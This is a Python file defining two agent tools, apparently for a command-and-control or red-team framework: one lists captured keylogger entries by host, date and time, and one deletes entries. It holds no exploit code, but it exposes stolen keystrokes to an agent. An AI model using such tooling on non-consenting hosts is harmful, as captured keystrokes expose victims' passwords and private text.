from logic.core import server
from logic import team_http

@server.tool(
    name="alice_keylogger_list",
    description="Lists captured keylogger rows via GET /api/keylogger/ with search and pagination.",
    annotations={"readOnlyHint": True, "destructiveHint": False, "openWorldHint": True},
)
def alice_keylogger_list(
    search="",
    host_tag="all",
    date="",
    time_from="",
    time_to="",
    page=1,
    page_size=50,
):
    # Returns keylogger content with optional host and time filters

    if page < 1:
        raise ValueError("page must be >= 1")

    if page_size < 1 or page_size > 500:
        raise ValueError("page_size must be between 1 and 500")

    params = {"page": page, "pageSize": page_size}
    text = str(search or "").strip()

    if text:
        params["search"] = text

    host = str(host_tag or "all").strip() or "all"

    if host != "all":
        params["hostTag"] = team_http.validate_host_tag(host)

    day = str(date or "").strip()

    if day:
        params["date"] = day

    start = str(time_from or "").strip()

    if start:
        params["timeFrom"] = start

    stop = str(time_to or "").strip()

    if stop:
        params["timeTo"] = stop

    payload = team_http.team_request("GET", "/api/keylogger/", params=params)
    status = str(payload.get("status", "")).strip().lower()

    if status == "failure":
        message = str(payload.get("message", "keylogger list failed"))
        raise RuntimeError(message)

    if status and status != "success":
        raise RuntimeError(f"unexpected keylogger list status: {status}")

    return team_http.format_team_response(payload)

@server.tool(
    name="alice_keylogger_delete",
    description="Deletes one keylogger row via DELETE /api/keylogger/{tag}.",
    annotations={"readOnlyHint": False, "destructiveHint": True, "openWorldHint": False},
)
def alice_keylogger_delete(entry_tag):
    # Removes a single keylogger database entry by its row tag
    try:
        raw = str(entry_tag or "").strip()

        if not raw:
            raise ValueError("entry_tag is required")

        tag = team_http.validate_entry_tag(raw)
        path = f"/api/keylogger/{team_http.quote_path_segment(tag)}"
        payload = team_http.team_request("DELETE", path)
    except Exception as exc:
        return team_http.format_team_response(
            {"status": "failure", "message": str(exc)},
        )

    status = str(payload.get("status", "")).strip().lower()

    if status == "failure":
        message = str(payload.get("message", "delete keylogger failed"))
        return team_http.format_team_response({"status": "failure", "message": message})

    if status and status != "success":
        return team_http.format_team_response(
            {"status": "failure", "message": f"unexpected delete keylogger status: {status}"},
        )

    return team_http.format_team_response(payload)